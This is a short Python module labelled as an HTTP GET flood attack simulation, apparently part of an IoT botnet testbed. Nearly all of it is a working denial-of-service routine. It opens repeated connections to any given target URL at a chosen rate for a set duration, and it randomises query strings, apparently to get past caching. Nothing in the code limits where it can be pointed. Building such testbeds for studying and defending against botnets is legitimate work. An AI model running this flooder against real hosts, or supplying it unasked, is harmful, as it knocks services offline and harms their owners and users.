"""HTTP GET flood attack simulation."""

from __future__ import annotations

import http.client
import logging
import os
import random
import time
from urllib.parse import urlparse

LOG_FORMAT = "[%(asctime)s][%(name)s][%(levelname)s] %(message)s"
DATE_FORMAT = "%Y-%m-%dT%H:%M:%S"
LOGGER = logging.getLogger("botnet.http_flood")


def configure_logging() -> None:
    """Configure module logging.

    Args:
        None.

    Returns:
        None.
    """
    logging.basicConfig(level=os.getenv("LOG_LEVEL", "INFO"), format=LOG_FORMAT, datefmt=DATE_FORMAT)


def run_http_flood(target_url: str, duration_seconds: int, packet_rate: int) -> int:
    """Send repeated HTTP GET requests to the target.

    Args:
        target_url: Target URL or host.
        duration_seconds: Duration of the attack.
        packet_rate: Requests per second.

    Returns:
        Total requests transmitted.
    """
    parsed = urlparse(target_url if target_url.startswith(("http://", "https://")) else f"http://{target_url}")
    host = parsed.hostname or target_url
    port = parsed.port or 80
    base_path = parsed.path or "/"
    end_time = time.time() + duration_seconds
    total_requests = 0

    while time.time() < end_time:
        for _ in range(max(1, packet_rate)):
            try:
                connection = http.client.HTTPConnection(host, port, timeout=2)
                random_query = f"{base_path}?id={random.randint(1, 1_000_000)}"
                connection.request("GET", random_query, headers={"User-Agent": "IoT-Testbed-Bot"})
                response = connection.getresponse()
                response.read()
                connection.close()
                total_requests += 1
            except Exception as exc:  # noqa: BLE001
                LOGGER.debug("HTTP flood request failed: %s", exc)
        time.sleep(1)

    LOGGER.info("HTTP flood finished: %s requests sent to %s", total_requests, target_url)
    return total_requests
